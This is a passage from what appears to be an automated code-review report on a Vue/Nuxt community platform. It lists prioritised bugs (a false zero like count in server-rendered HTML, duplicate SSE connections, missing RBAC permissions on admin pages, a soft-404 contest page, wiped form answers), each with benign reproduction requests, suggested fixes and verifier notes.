The stored value renders at ContestRules.vue:28 -> CpubMarkdown.vue:33 (format='html') -> sanitizeRichHtml -> balanceTags, emitting '<p>one<p>two</p></p>' into v-html, which the parser renders as three paragraphs, the third empty. Same reachability via the 'html' block (BlockHtmlView.vue:15) and the admin custom-html homepage section (CustomHtmlSection.vue:15). Note the empty paragraph is not visible on the page (no p margin rule; empty p self-collapses), so the observable effect is an extra empty DOM node, not layout drift.

**Suggested fix:** Treat `p` (and `li`, `dt`, `dd`, `td`, `th`, `tr`, `option`) as implicitly closed by a sibling of the auto-closing set: when pushing one of these, pop an already-open same/peer tag instead of nesting.

<details><summary>Verifier (high confidence)</summary>

Mechanism confirmed by my own differential run in this repo (vitest/jsdom): sanitizeRichHtml('<p>one<p>two') -> '<p>one<p>two</p></p>' parses to 3 children (extra empty <p>), vs 2 for the input; '<p>a<div>b</div>' likewise gains an empty <p>. balanceTags (useSanitize.ts:104-137) models only VOID_ELEMENTS, never implied end tags, so each synthetic </p> emitted after the parser already auto-closed that p creates an element per spec. li/td/dd stray end tags are ignored, as claimed. BUT two load-bearing sub-claims are FALSE and I verified both. (1) 'the case it was written for' is wrong: the documented live case (useSanitize.ts:95-98, pinned by sanitizeBalance.test.ts 'closes a body truncated mid-tag') is '<div class=a><div class=b><div class=c><p>Our sole point of c' — I ran it and input DOM and output DOM are byte-identical. A body truncated at a character cap leaves at most ONE open <p>, which balances correctly; the deveco rules body is precisely the case that does not trigger this. (2) The visual-impact story is fabricated: there is no '.cpub-md-html p { margin: 1em 0 }' rule. packages/ui/theme/prose.css:375-409 is the complete .cpub-md-html block (a, h1-h6, img, hr, blockquote, th/td, pre, code, table, media) with no p rule, and base.css has no global p reset. The p carries only the UA 1em 0, and an empty <p></p> is a self-collapsing block whose margins collapse with the preceding sibling's in a plain block container (.cpub-md-html is not flex/grid anywhere), so it adds zero visible height. Not a hydration mismatch either — the finding concedes SSR and CSR parse the same string. Net: a real but invisible spurious DOM node on a manager-authored field. P3, not P2.

</details>

#### [P3] An option value with surrounding whitespace validates as a condition but can never hold

`packages/schema/src/contest.ts:289`

`visibleFormFieldKeys`'s `satisfied()` trims the submitted answer (`(values[cond.field] ?? '').trim()`) before comparing against `cond.equals`, but `applyTemplateConditionRules` validates `equals` against the raw option `value` strings, and `submissionTemplateOptionSchema` does not trim (`value: z.string().min(1).max(120)`). So `equals: ['startup ']` against an option `{ value: 'startup ' }` passes validation and is unsatisfiable on both surfaces. The doc comment on `applyTemplateConditionRules` promises the opposite: it exists so "a stale value... hides the dependent field forever" cannot be saved.

**Failure:** Operator types `startup ` (trailing space, easy to do when pasting) into an option's "Value (stored)" box and gates a field on it. Save succeeds. The dependent field is invisible to every entrant forever, with nothing on either surface saying why. Verified: `registrationTemplateSchema.safeParse` on that template → `success: true`; `visibleFormFieldKeys(tmpl, { track: 'startup ' })` → `Set { 'track' }` — the dependent is absent even when the answer is byte-identical to the option value. Separately, `validateSubmissionFields` line 142-143 also trims before the `allowed.has(value)` check, so choosing that option 400s with "choose one of the listed options".

**Reachable input:** Two-step, both steps ordinary authenticated traffic on a live `contests`-enabled instance (deveco). Step 1, as the contest owner (or a `contest.manage` holder / per-contest editor): `PUT /api/contests/summer-build` with body `{"registrationTemplate":[{"key":"track","label":"Track","type":"select","required":true,"options":[{"value":"startup ","label":"Startup"},{"value":"hobby","label":"Hobby"}]},{"key":"funding","label":"Funding stage","type":"text","required":false,"showWhen":{"field":"track","equals":["startup "]}}]}` — note the single trailing space, exactly what a paste into the "Value (stored)" box produces. This returns 200; I confirmed `registrationTemplateSchema.safeParse` on that array is `success: true` against the built dist. Step 2, as any signed-in entrant: `POST /api/contests/summer-build/register` with `{"tier":"full","fields":{"track":"startup ","building":"..."}}` — the exact value the rendered `<option value="startup ">` yields. Result: 400 `Track: choose one of the listed options` (validation.ts:143), because the answer is trimmed to `startup` and the allowed set holds `startup `. Registration is impossible for anyone picking that choice. If the entrant instead picks `hobby` and registration succeeds, the `funding` field is never rendered on any surface — `visibleFormFieldKeys` returns `Set{'track'}` for `{track:'startup '}` as well as `{track:'startup'}`, verified by execution — so the operator's dependent field is dead for the life of the contest with no error anywhere. The condition half needs the `contestConditionalFields` flag only to author via the UI; the API path above accepts it regardless, and the select-unselectable half needs no flag at all.

**Suggested fix:** `.trim()` the option value in `submissionTemplateOptionSchema` (and the `equals` entries in `formFieldConditionSchema`) so stored, compared and validated values are the same string.

<details><summary>Verifier (high confidence)</summary>

The asymmetry is real, unguarded, and unpinned. I read `visibleFormFieldKeys` in full (packages/schema/src/contest.ts:260-291): `satisfied()` does `const raw = (values[cond.field] ?? '').trim()` then `cond.equals.includes(raw)`. The authoring side never normalizes: `submissionTemplateOptionSchema` (packages/schema/src/validators/contest.ts:145-148) is `value: z.string().min(1).max(120)` with no `.trim()`, `formFieldConditionSchema.equals` is `z.array(z.string().max(120))` with no `.trim()`, and `applyTemplateConditionRules` (validators/contest.ts:317-346) builds `allowed = (source.options ?? []).map(o => o.value)` from the raw strings and only checks `allowed.includes(v)` — so `equals: ['startup ']` against option `{value: 'startup '}` is byte-equal and passes. I hunted for every plausible guard and found none: no trim in the builder (`setOption` at layers/base/components/contest/FormTemplateEditor.vue:219 writes `($event.target).value` raw; the two `.trim()`s in that file are on the intro text only), no normalization in the save assembler (layers/base/composables/useContestEditor.ts:447 passes `registrationTemplate.value` through untouched; its many `.trim()`s cover prizes/criteria/email copy, not options), no DB constraint (jsonb column), and no flag on the write route — layers/base/server/api/contests/[slug]/index.put.ts checks only `requireFeature('contests')` plus owner/`contest.manage`/editor, so `contestConditionalFields` gates only what the BUILDER offers, not what the API accepts (the component comment at FormTemplateEditor.vue:87-90 says so explicitly). I verified against the built dist: `registrationTemplateSchema.safeParse` on the padded template returns `success: true`, and `visibleFormFieldKeys(tmpl, {track:'startup '})` returns `Set{'track'}` — the dependent is absent even when the answer is byte-identical to the option value, and absent for the trimmed answer too, i.e. unsatisfiable under every input. The existing test packages/schema/src/__tests__/formFieldConditions.test.ts:53 ("trims the answer before comparing, so a padded value still matches") pins the ANSWER-side trim as deliberate but says nothing about a padded OPTION value, so the gap is genuinely unpinned rather than intended. Git history shows no deliberate choice here. The doc comment on `applyTemplateConditionRules` states the validator exists precisely so a value the source "can never be" cannot be saved and "hides the dependent field forever" — this is a hole in the invariant it advertises, not a restatement of intent. The second half is independently reachable with NO flag at all: packages/server/src/contest/validation.ts:79 trims (`const value = (values[field.key] ?? '').trim()`) and lines 141-143 test `new Set((field.options ?? []).map(o => o.value)).has(value)`, so a padded option value is unselectable outright — and packages/server/src/contest/registrations.ts:162-166 routes real registrations through `validateSubmissionFields`, so a required padded-option select blocks registration entirely with "choose one of the listed options".

</details>

### The `server: false` zero-seed class, and frontend state/lifecycle

#### [P2] Every project/blog/explainer page serves `Like 0` in its HTML regardless of the real like count

`layers/base/composables/useEngagement.ts:101`

`useEngagement` seeds `likeCount = ref(0)` and `liked = ref(false)` (useEngagement.ts:99-101) and the real values are only assigned inside `fetchInitialState`, which all three content views call from `onMounted`. The count is not remote data — it is already in the SSR payload as `props.content.likeCount` (ContentDetail extends ContentListItem, packages/server/src/content/content.ts:135) — but the template binds the ref, not the prop. The page fetch is `useLazyFetch` without `server: false` (pages/u/[username]/[type]/[slug]/index.vue:13-16), so SSR resolves the content and renders the view server-side with the seed intact.

**Failure:** A project with 42 likes is served to a crawler, a reader with JS disabled, or any reader during the pre-hydration window as `<span class="cpub-count">0</span>` next to an outline heart labelled "Like". A reader who has already liked it sees the un-liked state. On mount the number jumps 0 -> 42 and the heart fills. This is the exact `feedback_ssr_zero_seed_is_a_lie_in_html` class the repo already recorded, and it affects every project, blog and explainer page on commonpub.io, deveco.io and heatsynclabs.io.

**Reachable input:** Unauthenticated, no JavaScript: `curl -s https://deveco.io/u/knitronics/project/knitronics-add-on-badge-for-open-sauce-2026` returns HTML containing `<button class="cpub-engage-btn"><i class="fa-regular fa-heart"></i> Like <span class="cpub-count">0</span></button>`, while `curl -s "https://deveco.io/api/content/knitronics-add-on-badge-for-open-sauce-2026?author=knitronics"` returns `"likeCount": 5`. Blog path reproduced identically at `GET https://deveco.io/u/heavyfalcon678/blog/open-sauce-2026` (SSR renders 0, API returns 3). Any published project or blog with likeCount > 0 reproduces it; explainer pages do not (no count in that template).

**Suggested fix:** Initialise `likeCount` from the prop at setup (`ref(props.content?.likeCount ?? 0)`) or bind the template to `props.content.likeCount` until the client fetch lands, and render `liked` as a neutral/unknown heart until `fetchInitialState` resolves rather than as a positive "not liked".

<details><summary>Verifier (high confidence)</summary>

Confirmed in code and reproduced against production. useEngagement.ts:99-101 seeds likeCount = ref(0); the only writers are setInitialState (:105) and fetchInitialState (:174-175), and ProjectView.vue:71-73 / ArticleView.vue:14-16 call fetchInitialState only from onMounted (client-only), while the templates bind the ref (ProjectView.vue:271, ArticleView.vue:150) rather than props.content.likeCount. The "useLazyFetch means it never SSRs" defence fails: Nuxt 3.21 asyncData.js sets fetchOnServer = options.server !== false && payload.serverRendered, then does initialFetch() + onServerPrefetch(() => promise), so the view IS rendered server-side with the seed. Verified live: /api/content/knitronics-add-on-badge-for-open-sauce-2026?author=knitronics returns likeCount 5, while the SSR HTML for that page contains `Like <span class="cpub-count">0</span>`. Same on ArticleView (/u/heavyfalcon678/blog/open-sauce-2026: API likeCount 3, SSR renders 0) — and ContentCard instances in the related strip on the same page render their real counts from props, proving the data is present and only this component seeds a false zero. No guard exists: no flag gates it, the route is public and unauthenticated, and the three view tests mock useEngagement wholesale (ProjectView.test.ts:22, ArticleView.test.ts:21, ExplainerView.test.ts:24 stub fetchInitialState with vi.fn()), so nothing pins the correct behaviour. Two corrections to the finding: ExplainerView renders no like count at all (only the heart glyph at :212-213), so the false zero affects project and blog/article pages, not explainer pages; and `liked = ref(false)` at SSR is per-viewer state and defensible — the count is the defect.

</details>

#### [P2] Every authenticated page opens two SSE connections to /api/realtime/stream, doubling the 30s polling

`layers/base/composables/useRealtimeCounts.ts:10`

`useRealtimeCounts` shares its counters via `useState` but keeps `eventSource`, `retryDelay` and `retryTimer` as plain locals inside the function body (:10-12). Every call therefore gets its own private connection slot, and the `if (import.meta.server || eventSource) return` guard at :16 only guards that one closure. `useNotifications()` (useNotifications.ts:3) and `useMessages()` (useMessages.ts:3) each call it separately, and `layouts/default.vue:11-12` calls both, then `onMounted` calls `connectNotifications()` and `connectMessages()` (default.vue:94-95). Two EventSources per tab, both streaming the identical `{type:'counts'}` payload. The file's own docstring says it "Replaces the separate useNotifications() and useMessages() EventSource connections."

**Failure:** Every logged-in visitor to any default-layout page holds two `/api/realtime/stream` connections. Each one runs `getUnreadCount` + `getUnreadMessageCount` on a 30s timer server-side (stream.get.ts:11-13) and holds its own Redis subscriber, so the DB and Redis cost of the realtime feature is exactly 2x what the route was sized for — on top of round 1's finding that the unread-message count scans full message history. The per-user cap is 10 (stream.get.ts:33), so a user with six tabs open hits 429 on the twelfth connection; `onerror` sees `readyState === 2` and returns without retrying (:37-40), so that tab's badges silently stay at zero for the session. Secondarily, `connected` is shared useState while the closures are not, so one connection erroring flips `connected` false while the other is healthy.

**Reachable input:** `GET /` (or any page rendered by `layers/base/layouts/default.vue`, which is every page in every app since no app overrides it) with a valid Better Auth session cookie. On mount, `refreshSession()` resolves `isAuthenticated` true, then `default.vue:94-95` runs `connectNotifications()` and `connectMessages()`, each constructing its own `new EventSource('/api/realtime/stream')`. Observable in DevTools Network as two concurrent `text/event-stream` requests to that URL from a single tab, both receiving identical `{"type":"counts",...}` payloads. To reach the 429 degradation: open the same authenticated site in 6 browser tabs against a single Nitro process; tabs 1-5 consume all 10 slots of `MAX_CONNECTIONS_PER_USER`, and both connections from tab 6 receive `429 Too many concurrent realtime connections`, after which `onerror` sees `readyState === 2` and returns without retrying, leaving that tab's notification and message badges at zero permanently.

**Suggested fix:** Hoist `eventSource`, `retryDelay` and `retryTimer` to module scope (or into a `useState`-backed ref-counted handle) so the `if (eventSource) return` guard is global, and make `disconnect()` reference-counted so the first caller to unmount does not tear down the stream the other caller still needs.

<details><summary>Verifier (high confidence)</summary>

Verified by reading the code, not the cited line alone. `useRealtimeCounts.ts:10-12` declares `eventSource`/`retryDelay`/`retryTimer` as `let` bindings inside the exported function body, while only the counters (`:6-8`) use `useState`. Nuxt auto-imported composables are plain function calls with no memoization, so every invocation gets a private connection slot and the `if (import.meta.server || eventSource) return` guard at `:16` guards only that closure. `useNotifications.ts:3` and `useMessages.ts:3` are two independent invocations; `layouts/default.vue:11-12` destructures both and `:94-95` calls both `connect()` functions in the same `onMounted` behind only an `isAuthenticated` check. Result: two EventSource connections to `/api/realtime/stream` per authenticated tab, each running `getUnreadCount` + `getUnreadMessageCount` on a 30s interval and holding its own Redis subscriber (`stream.get.ts:97-101, 128-134`). I hunted for every guard that could make this unreachable and found none: (a) no layout override — `apps/reference/layouts` and `apps/shell/layouts` do not exist, so all apps inherit `layers/base/layouts/default.vue`; (b) no feature flag gates the connect calls, only `isAuthenticated`; (c) no test pins the behaviour — the only file in `layers/base/layouts/__tests__/` is `admin.test.ts` and there is no test for the composable; (d) grep for the shared state keys and for `EventSource` shows no memoizing wrapper or plugin (the only other EventSource is `pages/messages/[conversationId].vue`, a different route not subject to this cap). Git history refutes an "intended behavior" reading. Commit dd4f3109 states the goal as "halving DB polls and open connections per user", and the file docstring says it "Replaces the separate useNotifications() and useMessages() EventSource connections." The code does not do what its own commit claims. Two corrections to the claim. (1) Arithmetic: the cap check is `current >= MAX_CONNECTIONS_PER_USER` evaluated before increment, so tabs 1-5 consume all 10 slots and BOTH connections of the 6th tab are rejected (the 11th and 12th, not "the twelfth"). The effective tab budget is halved from 10 to 5. The consequence stands: an HTTP 429 makes the browser close the EventSource permanently, `onerror` reads `readyState === 2`, sets `wasClosed` and returns without scheduling a retry (`:37-40`), so that tab's badges stay at zero for its lifetime. (2) The secondary `connected` point is correct — it is shared `useState` while the closures are not, so one connection erroring flips the shared flag false while the other is healthy. Severity P2 confirmed: it is a 2x steady-state DB/Redis cost on every authenticated pageview plus a silent functional failure at 5+ open tabs, not a security, auth, or data-correctness defect. Fix is one line of scope: hoist `eventSource`/`retryDelay`/`retryTimer` to module scope.

</details>

#### [P2] RBAC permissions never reach the client on /admin pages, so a non-admin grantee gets an empty sidebar

`layers/base/plugins/auth.ts:15`

`useCan()` reads `useState('auth-permissions')` (useAuth.ts:57, useCan.ts:12-21), which is populated in exactly one place: `refreshSession()` (useAuth.ts:96). `refreshSession` returns immediately on the server (useAuth.ts:89) and is called from only three sites — `layouts/default.vue:92`, and the login/verify-email pages. Every admin page sets `definePageMeta({ layout: 'admin' })`, and `layouts/admin.vue` has no `onMounted` and never calls it. So on a hard load of any admin URL, `permissions` is `[]` on the server AND stays `[]` on the client indefinitely. The data is not missing — `server/middleware/auth.ts:122-127` resolves it into `event.context.cpubPermissions` on every SSR request — `plugins/auth.ts` just reads `event.context.auth` and never forwards it.

**Failure:** An operator enables RBAC from /admin/roles (the confirm text at roles.vue:28 promises "Role permissions take effect immediately: any user with the staff role becomes a moderator"). A staff user with `content.moderate` bookmarks /admin/content and opens it, or presses F5 while on it. `adminEnabled` is true so the admin chrome renders, but `isAdmin` is false and `permissions` is `[]`, so all fifteen `useCan` calls in layouts/admin.vue:11-25 return false and every nav link is `v-if`-ed away. They get a topbar, an empty sidebar, and no way to navigate. It only works if they first land on a default-layout page in the same SPA session, because `useState` survives client-side navigation. Even on default-layout pages (HubFeed.vue:17, pages/products/[slug].vue:10, pages/hubs/[slug]/index.vue:53) the same gap means moderation controls are absent from the SSR HTML and pop in after `/api/me` resolves.

**Reachable input:** On deveco.io or commonpub.io today (both have the `rbac` DB override ON per docs/STATUS.md:1207-1215, and `features.admin` on): sign in as a user whose `users.role` is `staff` (migration 0025 grants that role content.moderate, reports.review, audit.read, users.read and backfills user_roles), then issue a top-level browser navigation `GET https://deveco.io/admin/content` — a typed URL, a bookmark, or F5 while on the page. The `auth` route middleware passes (authenticated), `layouts/admin.vue` renders because `features.admin` is true, and `server/middleware/auth.ts:126` populates `event.context.cpubPermissions` with the four staff grants. But `plugins/auth.ts` writes only `auth-user`/`auth-session`, so `useState('auth-permissions')` is [] in the SSR payload, and nothing in the admin layout calls `refreshSession()` to fill it after hydration. Result: `isAdmin` is false and `permissions` is [], so all 16 `useCan`-gated NuxtLinks in layouts/admin.vue:80-160 are v-if-ed away. The user gets the topbar and an empty sidebar, with no link to /admin/content, /admin/reports, /admin/users or /admin/audit despite holding exactly those permissions. Confirming the negative case: the same request as an `admin`-role user renders the full sidebar, because `isAdmin` derives from the SSR-hydrated `auth-user.role` and useCan.ts:14 short-circuits on the admin floor.

**Suggested fix:** Forward the already-resolved set in `plugins/auth.ts`: read `event.context.cpubPermissions` alongside `event.context.auth` and write it into the `auth-permissions` / `auth-role-keys` useState during SSR. That fixes the admin layout and removes the flash on every default-layout moderation control at the same time.

<details><summary>Verifier (high confidence)</summary>

Confirmed by reading every file in the chain. `auth-permissions` (useAuth.ts:57) has exactly one writer, `refreshSession` at useAuth.ts:96, which returns early on the server (useAuth.ts:89). `plugins/auth.ts` hydrates only `auth-user`/`auth-session` from `event.context.auth` and never forwards `event.context.cpubPermissions`, even though `server/middleware/auth.ts` resolves it on every request and `server/api/me.get.ts` proves it is available. `grep -rn refreshSession layers/base` yields only layouts/default.vue:92, pages/auth/login.vue:81, pages/auth/verify-email.vue:36; `layouts/admin.vue` has no onMounted, no NuxtLayout nesting, and no plugin or route middleware populates permissions. So on any /admin page `permissions` is [] on the server and stays [] on the client, and all 16 `v-if="can*"` nav links in layouts/admin.vue:80-160 are hidden for any non-admin (isAdmin comes from user.role and is correctly SSR-hydrated, so admins are unaffected). I hunted for four guards and all four fail to save it. (1) The `features.rbac` flag defaults false (packages/config/src/schema.ts:136), which would have made this dead code — but docs/STATUS.md:1207-1215 records rbac as ON on commonpub.io and deveco.io ("its staff users are now moderators"), OFF only on heatsynclabs.io. (2) Route auth: /admin pages use `middleware: 'auth'` (layers/base/middleware/auth.ts) which checks isAuthenticated only; layouts/admin.vue gates on `features.admin`, not isAdmin. A staff user really does render the admin chrome. (3) Grant existence: migration 0025_round_malice.sql seeds the `staff` role with content.moderate, reports.review, audit.read, users.read and backfills user_roles, so non-admin grantees exist in production. (4) The pinning test layers/base/layouts/__tests__/admin.test.ts stubs `useCan` wholesale, so it verifies the gating logic while being structurally blind to the state-population path it depends on; it asserts exactly the behaviour the runtime fails to deliver. One correction that makes the finding slightly stronger than written: `grep -rn 'to="/admin"' layers/base` returns a single hit, inside layouts/admin.vue itself. There is no link into the admin panel from the default layout or any component, so every arrival at an /admin URL is a hard SSR load. The writeup's mitigation ("it only works if they first land on a default-layout page in the same SPA session") does not apply — for a non-admin grantee the sidebar is empty on every visit, not just on refresh. Severity held at P2, not raised: this is navigation-only. The server remains the enforcement boundary (requirePermission), useCan is advisory by design, the page body of /admin/content still renders and its API calls still succeed, and the user can reach pages by typing URLs. No privilege escalation, no data exposure, no crash. But the per-permission admin chrome is 100% non-functional for its entire intended audience on two of three live instances, so it is not P3 either.

</details>

#### [P3] Follow-author button on every blog post is permanently wrong: `isFollowingAuthor` is never produced

`layers/base/components/views/ArticleView.vue:48`

`followingAuthor` is seeded from `props.content.isFollowingAuthor`, a field that does not exist anywhere in the repo. A grep for `isFollowingAuthor` across `packages/` and `layers/` returns exactly one hit — this line. No serializer emits it, no route adds it, and unlike the profile page (pages/u/[username]/index.vue:213-218, which correctly seeds from the SSR'd `profile.isFollowing`) there is no follow-up fetch to correct it. The ref is `false` forever.

**Failure:** A reader who already follows author X opens any blog/article by X. The author card shows an RSS icon and the label "Follow" (ArticleView.vue:258-259). They press it: `followingAuthor` is false so the handler POSTs `/api/users/X/follow`, which is a no-op (`onConflictDoNothing`, packages/server/src/social/social.ts:716) returning `followed: false`, and the button flips to "Following" having changed nothing. If they press it a second time — the natural response to a button that appears to have just toggled — it DELETEs and silently unfollows an author they wanted to keep following. No toast fires on the first press, so nothing signals that the first click did nothing.

**Reachable input:** Authenticated user alice already follows bob (a row exists in `follows` with followerId=alice, followingId=bob — e.g. created earlier from bob's profile page). alice issues `GET /u/bob/blog/my-post` (any published, public blog/article by bob). The page fetches `GET /api/content/my-post?author=bob`, whose 200 body contains no `isFollowingAuthor` key, so `ArticleView.vue:48` seeds `followingAuthor = false` and the author card renders the `fa-rss` icon with the label "Follow" even though alice already follows bob. Pressing it sends `POST /api/users/bob/follow` as alice, which returns 200 `{"followed": false}` (onConflictDoNothing, `packages/server/src/social/social.ts:716-728`) and changes nothing, while the label flips to "Following" with no toast. No feature flag blocks this (`social` defaults true) and no authorization gate is involved beyond being logged in.

**Suggested fix:** Add `isFollowingAuthor` to the content detail route the way `/api/users/[username].get.ts:18` already adds `isFollowing`, or drop the cast and fetch the state on mount like `pages/federated-hubs/[id]/posts/[postId].vue:34-42` does. Either way remove the `as unknown as` cast so the compiler catches the next missing field.

<details><summary>Verifier (high confidence)</summary>

The core factual claim holds, and I read every link in the chain myself. CONFIRMED FACTS: - `layers/base/components/views/ArticleView.vue:48` is exactly as quoted: `const followingAuthor = ref((props.content as unknown as Record<string, unknown>).isFollowingAuthor as boolean ?? false);` The `as unknown as Record<string, unknown>` cast is why a non-existent field typechecks. - The only source hit for `isFollowingAuthor` in the whole repo is that line (the other grep hits were `apps/shell/.output` build artifacts of the same component). - Producer side: ArticleView is rendered from `layers/base/pages/u/[username]/[type]/[slug]/index.vue:105` with `enrichedContent` = `{...content, readTime}` where `content` comes from `GET /api/content/{slug}?author={username}` → `layers/base/server/api/content/[id]/index.get.ts` → `getContentBySlug` (`packages/server/src/content/content.ts:559-690`). I read the whole return object: it emits tags/author/related/etc. and nothing named `isFollowingAuthor`. `ContentDetail` (`packages/server/src/types.ts:211-234`) and `ContentDetailAuthor` (:193-200) have no such field either. The viewer id (`requesterId`) is used only for the draft/visibility gates, never for a follow lookup. - No correcting fetch exists: `useEngagement` handles like/bookmark/share only (its sole "follow" hit is `followerCount?`). There is no watcher like the profile page's (`pages/u/[username]/index.vue:212-218` seeds `following` from `profile.isFollowing`, which the server genuinely emits — `social.ts:813,851`, `federation.ts:355,410`). So the ref is `false` for every viewer, forever. - No guard blocks it. The button at :257-260 is inside `v-if="content.author"` with no flag check. `features.social` defaults to `true` (`packages/config/src/schema.ts:27`), and the POST route (`users/[username]/follow.post.ts`) only calls `requireFeature('social')` + `requireAuth`. `followUser` (`social.ts:706-728`) is `onConflictDoNothing().returning()` → returns `{followed:false}` with HTTP 200 when the row already exists, so the no-op press does not even error. - Not deliberate: git blame shows the line was born in the original layer-extraction commit 00790b98 with the cast already there — a field that was assumed, never wired. WHY I DOWNGRADED THE SEVERITY (P2 → P3): The reported failure chain overstates the harm. For a viewer who does NOT follow the author the button is correct. For a viewer who DOES follow, the first press is a no-op that flips the label to "Following" — i.e. the UI self-corrects to the true state on first interaction; no data changes and nothing is lost. The claimed data loss requires a second, deliberate click on a button that by then reads "Following" with a `fa-user-check` icon, which is the standard, correctly-labeled unfollow affordance. That is a user choosing to unfollow, not the bug silently unfollowing them. What remains is a real but cosmetic state bug: a stale "Follow" label shown to existing followers on every blog/article page, plus one wasted POST, plus (separately visible in the same handler) no success toast at all, unlike the profile page. No crash, no security exposure, no unrecoverable state. One extra note the finding missed: the same broken button also renders on `pages/mirror/[id].vue:101`, where pressing it POSTs to `/api/users/{remote-username}/follow` — a local-user lookup that will 404 for a remote actor — while that page has its own separate, correct federated follow path at :23-36. Same root cause, wider blast radius than reported.

</details>

#### [P3] A nonexistent or unviewable contest renders a fake contest page with HTTP 200 and a Register button

`layers/base/pages/contests/[slug]/index.vue:14`

`const { data: contest } = await useFetch('/api/contests/'+slug)` destructures only `data`. `useFetch` never throws — a 404 or 500 leaves `data` null and populates the unread `error`. The page has no `createError`, no `v-if` guard on `c`, and no not-found branch anywhere (grep for `createError` in the file returns zero hits, unlike its sibling register.vue:20 which does guard). Every downstream computed falls back to a literal: ContestHero renders `{{ c?.title || 'Contest' }}` (:271) and `{{ c?.status || 'upcoming' }}` (:259), and `showRegisterCta` is true because `isFullyRegistered` is false.

**Failure:** `GET /contests/anything-at-all` returns HTTP 200 with a rendered page: an `<h1>Contest</h1>`, an "upcoming" status pill, an Overview/Entries tab band, and a primary "Register for this contest" button. It is indexable as a soft 404 — `useSeoMeta` sets the title to "Contest, <siteName>" with no noindex. The same page is what a stranger gets for a private contest, because the route deliberately 404s rather than 403s to avoid leaking existence (index.get.ts:11-15). And it is what EVERY visitor to the live deveco contest would get during a transient DB blip or 500 on `/api/contests/:slug`: not an error page, but a plausible-looking empty contest inviting them to register for it. 34 dynamic pages across the app have zero `createError` calls; this one is the sharpest because it has no in-page not-found branch either (contrast pages/u/[username]/[type]/[slug]/index.vue:168, which at least renders "Content not found" — still a soft 200, but honest).

**Reachable input:** Unauthenticated `GET https://deveco.io/contests/this-slug-does-not-exist` (any contests-enabled instance; the flag gate at layers/base/middleware/feature-gate.global.ts only 404s when features.contests is off). The inner `GET /api/contests/this-slug-does-not-exist` 404s, useFetch swallows it into the undestructured `error`, and the page returns HTTP 200 with a rendered skeleton titled "Contest, devEco" — no createError, no noindex. Same request shape with a private contest's real slug as a non-stakeholder produces the identical 200 skeleton. What it does NOT produce, contrary to the finding, is a Register button on any of the three CTA surfaces.

**Suggested fix:** Destructure `error` and do what register.vue:20 already does: `if (error.value || !contest.value) throw createError({ statusCode: 404, statusMessage: 'Contest not found' })`. Apply the same guard to the other detail pages with no `createError` (events/[slug], hubs/[slug], products/[slug], videos/[id], learn/[slug], docs/[siteSlug]) so a missing resource is a 404 rather than a 200 skeleton.

<details><summary>Verifier (high confidence)</summary>

Core defect confirmed but materially overstated; severity downgraded P2 -> P3. CONFIRMED: layers/base/pages/contests/[slug]/index.vue:14 destructures only `data`; the file has never had a createError (git log -S"createError" on the path is empty); there is no route middleware or setResponseStatus in the layer; server/api/contests/[slug]/index.get.ts:9,13-15 throws 404 for both missing and unviewable. So a bad slug SSRs an HTTP 200 page with <h1>Contest</h1> (ContestHero.vue:271), an "upcoming" pill (:259), a tab band, an "About This Contest" heading, a sidebar status of "unknown", and <title>Contest, {siteName}</title> with no noindex. That is a genuine indexable soft 404. REFUTED, and it is the load-bearing half of the claim: there is NO Register button. ContestHero.vue:225-226 `const canRegister = computed(() => REGISTERABLE.includes(c.value?.status ?? ''))` -> '' is not in ['upcoming','active'], so showRegisterCta (:233) is FALSE; the finding read only the `!isFullyRegistered` conjunct and missed `canRegister &&`. ContestActionBar.vue:75 `shouldRender = !!props.contest && ...` renders nothing. ContestSidebar.vue:51/181 uses the same status guard, so its register button is suppressed. index.vue:648 entries CTA is `v-if="c?.status === 'active'"`. layers/base/utils/contestCounts.ts suppresses both counts at zero, so no "0 makers registered" either. The private-contest angle adds nothing: the 200 page for a private contest is identical to the one for a nonexistent slug (all fields null), so no existence leak. Residual impact is SEO/UX only: an empty skeleton with a Share button served as 200 instead of 404. Not a security, data, or availability defect; behind features.contests (on for deveco/commonpub, so reachable). P3.

</details>

#### [P3] The registration form wipes typed answers when the client-only saved-answers fetch lands

`layers/base/components/contest/ContestRegistrationForm.vue:53`

`seed()` deletes every key in the reactive `values` map and re-seeds from `props.savedFields` (:46-52), and it is driven by `watch(() => [props.savedFields, props.template], () => seed(props.savedFields), { immediate: true, deep: true })` (:53). On `/contests/:slug/register`, `savedFields` comes from a `{ server: false }` fetch (register.vue:26-29, :32), so it is null through SSR and hydration and changes identity when the request resolves. The form itself is rendered and interactive the whole time.

**Failure:** An entrant who is already registered opens /contests/<slug>/register to correct one answer. The form paints immediately (with the heading "Register for <title>" rather than "Edit your registration", register.vue:62 — the same zero-seed class). They start typing before `/api/contests/<slug>/register` resolves. When it does, `savedFields` goes null -> object, the watcher fires, `seed()` runs `for (const k of Object.keys(values)) delete values[k]`, and everything they typed is replaced by the stored values. Narrow window on a fast connection; wide on mobile, and wider still on a long form where the first field is focused and typed into instantly. First-time registrants are not affected: `savedFields` stays `null` on both sides, so the computed does not signal a change.

**Reachable input:** Authenticated user U is registered at tier 'full' on contest slug S, whose `registrationTemplate` is "rich" (contains a `section` field, or an address/file/signature field, or >5 non-section fields — contestRegistration.ts:17-23). U is on `/contests/S` and clicks the "Edit your details" button (ContestSignup.vue:288), which calls `onEditDetails()` -> `navigateTo('/contests/S/register')`. The page mounts immediately; `GET /api/contests/S/register` is issued client-only (`server: false`) and is in flight. U types into the first field during that round trip. When the response arrives with `{"registered":true,"tier":"full","fields":{"name":"Grace","country":"ca",...}}`, `props.savedFields` goes null -> object, the `deep: true` watcher at ContestRegistrationForm.vue:53 fires, `seed()` runs `for (const k of Object.keys(values)) delete values[k]`, and every character U typed is replaced by the stored answer. Same outcome on a cold load of the URL, after hydration completes and before the fetch resolves.

**Suggested fix:** Track whether the participant has interacted (the component already has a `touched` set at :104) and skip the re-seed once anything is touched, the way pages/admin/data-sharing.vue:276-282 already refuses to overwrite unsaved edits with `if (dirty.value) return;`. Better: do not render the form at all until the saved-answers fetch settles, so there is no pending window to type into.

<details><summary>Verifier (high confidence)</summary>

